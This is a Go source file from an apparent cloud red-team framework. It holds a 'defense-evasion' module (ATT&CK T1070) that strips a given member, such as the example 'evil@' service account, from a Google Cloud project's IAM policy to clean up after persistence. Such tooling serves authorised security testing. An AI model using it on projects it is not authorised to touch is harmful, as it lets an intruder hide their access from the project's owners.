package iam

import (
	"context"
	"fmt"

	cloudresourcemanager "google.golang.org/api/cloudresourcemanager/v1"

	"github.com/user/nimbus/internal/module"
	"github.com/user/nimbus/internal/output"
)

func init() {
	module.Register(&RemoveBinding{})
}

// RemoveBinding removes a specific IAM binding from a project's policy for cleanup.
type RemoveBinding struct{}

func (m *RemoveBinding) Info() module.Info {
	return module.Info{
		Name:         "defense-evasion.iam.remove-binding",
		Tactic:       module.TacticDefenseEvasion,
		Service:      "iam",
		Description:  "Remove a specific IAM binding from a project (cleanup after persistence)",
		RequiresAuth: true,
		AttackID:     "T1070",
	}
}

func (m *RemoveBinding) Run(ctx module.RunContext) error {
	member := ctx.Flags["member"]
	role := ctx.Flags["role"]

	if member == "" || role == "" {
		output.Warn("Usage: run defense-evasion.iam.remove-binding --member <member> --role <role>")
		output.Info("Example: --member serviceAccount:evil@proj.iam.gserviceaccount.com --role roles/editor")
		return nil
	}

	projects := module.EnsureProjects(&ctx)
	if len(projects) == 0 {
		output.Warn("No project specified.")
		return nil
	}
	project := projects[0]

	svc, err := cloudresourcemanager.NewService(context.Background(), ctx.Session.ClientOption())
	if err != nil {
		return fmt.Errorf("create CRM client: %w", err)
	}

	output.Info("Fetching IAM policy for project: %s", project)

	policy, err := svc.Projects.GetIamPolicy(project,
		&cloudresourcemanager.GetIamPolicyRequest{},
	).Do()
	if err != nil {
		return fmt.Errorf("get IAM policy: %w", err)
	}

	removed := false
	var updatedBindings []*cloudresourcemanager.Binding
	for _, binding := range policy.Bindings {
		if binding.Role == role {
			var filteredMembers []string
			for _, m := range binding.Members {
				if m != member {
					filteredMembers = append(filteredMembers, m)
				} else {
					removed = true
				}
			}
			// Keep binding only if it still has members.
			if len(filteredMembers) > 0 {
				binding.Members = filteredMembers
				updatedBindings = append(updatedBindings, binding)
			}
		} else {
			updatedBindings = append(updatedBindings, binding)
		}
	}

	if !removed {
		output.Warn("Binding not found: member=%s role=%s in project %s", member, role, project)
		return nil
	}

	policy.Bindings = updatedBindings

	_, err = svc.Projects.SetIamPolicy(project,
		&cloudresourcemanager.SetIamPolicyRequest{
			Policy: policy,
		},
	).Do()
	if err != nil {
		return fmt.Errorf("set IAM policy: %w", err)
	}

	output.Success("Removed binding: %s -> %s from project %s", member, role, project)

	if ctx.Findings != nil {
		ctx.Findings <- module.Finding{
			Module:      "defense-evasion.iam.remove-binding",
			Severity:    module.SevHigh,
			Title:       "IAM binding removed for defense evasion",
			Description: fmt.Sprintf("Removed %s from role %s in project %s", member, role, project),
			Resource:    member,
			Project:     project,
		}
	}

	return nil
}
